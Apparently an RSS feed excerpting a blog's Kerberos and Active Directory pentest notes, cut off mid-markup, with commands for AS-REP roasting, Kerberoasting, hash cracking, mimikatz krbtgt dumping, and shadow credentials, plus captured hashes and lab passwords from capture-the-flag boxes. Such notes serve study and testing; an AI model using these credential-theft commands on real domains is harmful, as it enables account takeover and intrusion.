<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Kerberos on Owlglass</title>
    <link>https://kdbed.github.io/tags/kerberos/</link>
    <description>Recent content in Kerberos on Owlglass</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://kdbed.github.io/tags/kerberos/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Active Directory: lastLogon vs lastLogonTimestamp</title>
      <link>https://kdbed.github.io/posts/lastlogon_vs_lastlogontimestamp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/lastlogon_vs_lastlogontimestamp/</guid>
      <description>&lt;h2 id=&#34;lastlogon-vs-lastlogontimestamp&#34;&gt;lastLogon vs lastLogonTimestamp&lt;/h2&gt;&#xA;&lt;h3 id=&#34;lastlogon&#34;&gt;lastLogon&lt;/h3&gt;&#xA;&lt;p&gt;The lastLogon attribute contains a Windows FileTime representation of the last time a domain controller successfully authenticated the user. It is the granddaddy of user logon metadata, having been around since the first version Active Directory.&lt;/p&gt;&#xA;&lt;p&gt;Using the PowerShell command below, you can retrieve the last logon time and other user properties on a domain controller:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ADUser -Filter * -Properties lastLogon | Select samaccountname,@&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;Name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lastLogon&amp;#34;&lt;/span&gt;;Expression&lt;span style=&#34;color:#f92672&#34;&gt;={[&lt;/span&gt;datetime&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;::FromFileTime&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$_.&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lastLogon&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)}}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The LastLogon attribute is updated every time a domain controller successfully processes a logon request, but it is not a replicated attribute. Each domain controller (DCs) maintains its own version of the attribute for any specific user.&lt;/p&gt;</description>
    </item>
    <item>
      <title>AS-REP Roasting</title>
      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
      <description>&lt;h2 id=&#34;as-rep-roasting&#34;&gt;AS-REP Roasting&lt;/h2&gt;&#xA;&lt;p&gt;Two key attacks on &lt;a href=&#34;https://kdbed.github.io/posts/kerberos/&#34;&gt;Kerberos&lt;/a&gt; security in Active Directory include &lt;a href=&#34;https://kdbed.github.io/posts/kerberoasting/&#34;&gt;kerberoasting&lt;/a&gt; and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.&lt;/p&gt;&#xA;&lt;p&gt;Use the &lt;a href=&#34;https://kdbed.github.io/posts/impacket/&#34;&gt;Impacket&lt;/a&gt; tool &lt;code&gt;GetNPUsers.py&lt;/code&gt; to try to get a hash for each user&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;λ ~/ctf/htb/forest/ &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; user in &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat usernames.txt&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; | grep -v Impacket; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; sebastien&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User sebastien doesn&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Getting TGT for lucinda&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[-] User lucinda doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH set&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; svc-alfresco&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; andy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User andy doesn&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Getting TGT for mark&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[-] User mark doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH set&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; santi&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User santi doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH set&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;list-of-users&#34;&gt;List of users&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/ -no-pass -usersfile users.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 id=&#34;crack-hash-or-use-pass-the-hash&#34;&gt;Crack hash or use pass-the-hash&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&#xA;&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;john --format&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;krb5asrep --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wordlist.txt hash.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# or&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;18200&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  hash.txt wordlist.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The hash is quickly cracked with &lt;code&gt;hashcat&lt;/code&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Golden Ticket</title>
      <link>https://kdbed.github.io/posts/golden_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/golden_ticket/</guid>
      <description>&lt;h2 id=&#34;golden-ticket&#34;&gt;Golden Ticket&lt;/h2&gt;&#xA;&lt;p&gt;A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account’s NTLM hash. Once created, it can be used to impersonate any user in the domain, including domain admins, and grants unlimited access to services in the domain.&lt;/p&gt;&#xA;&lt;h3 id=&#34;overview&#34;&gt;Overview&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Forged TGT signed with the KRBTGT hash&lt;/li&gt;&#xA;&lt;li&gt;Bypasses domain authentication controls&lt;/li&gt;&#xA;&lt;li&gt;Can impersonate any user in the domain&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;SYSTEM or Domain Admin privileges on a domain-joined machine&lt;/li&gt;&#xA;&lt;li&gt;Access to the NTLM hash of the KRBTGT account&lt;/li&gt;&#xA;&lt;li&gt;Knowledge of:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Domain SID&lt;/li&gt;&#xA;&lt;li&gt;Domain name&lt;/li&gt;&#xA;&lt;li&gt;(Optional) actual usernames&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;key-concepts&#34;&gt;Key Concepts&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;KRBTGT account&lt;/strong&gt;: Used by KDC to sign/encrypt TGTs&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;SID&lt;/strong&gt;: Used to tie forged ticket to domain&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;TGT&lt;/strong&gt;: Ticket Granting Ticket (used to request service tickets)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;mimikatz-commands&#34;&gt;Mimikatz Commands&lt;/h3&gt;&#xA;&lt;h4 id=&#34;dump-krbtgt-hash&#34;&gt;Dump KRBTGT Hash&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mimikatz &lt;span style=&#34;color:#75715e&#34;&gt;# privilege::debug&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mimikatz &lt;span style=&#34;color:#75715e&#34;&gt;# lsadump::lsa /inject /name:krbtgt&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Look for:&#xA;Hash NTLM: a2c0b1f65a098dc5b3e3479e9d88cb5e&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://kdbed.github.io/posts/kerberoasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kerberoasting/</guid>
      <description>&lt;h2 id=&#34;kerberoasting&#34;&gt;Kerberoasting&lt;/h2&gt;&#xA;&lt;p&gt;Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.&lt;/p&gt;&#xA;&lt;h3 id=&#34;rubeus&#34;&gt;Rubeus&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Rubeus.exe kerberoast&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Then crack the hashes with hashcat&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;13100&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; hash.txt Pass.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.239.179 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Kerbrute</title>
      <link>https://kdbed.github.io/posts/kerbrute_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kerbrute_enumeration/</guid>
      <description>&lt;h2 id=&#34;kerbrute&#34;&gt;Kerbrute&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.&lt;/li&gt;&#xA;&lt;li&gt;based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We&amp;rsquo;ll need to provide a username and password to do this. If the credentials are valid, we&amp;rsquo;ll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response. By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;kerberos-pre-authentication-behavior&#34;&gt;Kerberos Pre-Authentication Behavior&lt;/h3&gt;&#xA;&lt;p&gt;Kerberos authentication starts with an AS-REQ (Authentication Service Request) sent to the Key Distribution Center (KDC), which is typically the domain controller.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Pass the Ticket (PtT) Attack</title>
      <link>https://kdbed.github.io/posts/pass_the_ticket_ptt_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pass_the_ticket_ptt_attack/</guid>
      <description>&lt;h2 id=&#34;pass-the-ticket&#34;&gt;Pass the Ticket&lt;/h2&gt;&#xA;&lt;p&gt;Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin&amp;rsquo;s ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Pentest - Active Directory - Shadow Credentials</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</guid>
      <description>&lt;h2 id=&#34;shadow-credentials&#34;&gt;Shadow Credentials&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/ShutdownRepo/pywhisker&#34;&gt;pywhisker&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Abuse the GenericWrite ACL to get control of an account by adding shadow credentials:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 /opt/pywhisker/pywhisker.py -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certified.htb&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;judith.mader&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;judith09&amp;#34;&lt;/span&gt; --target &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;management_svc&amp;#34;&lt;/span&gt; --action &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;add&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The output is a PFX cert that can be used to authenticate as the user. Get a &lt;code&gt;TGT&lt;/code&gt; for the user with &lt;a href=&#34;https://github.com/dirkjanm/PKINITtools&#34;&gt;PKINITtools&lt;/a&gt;:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table 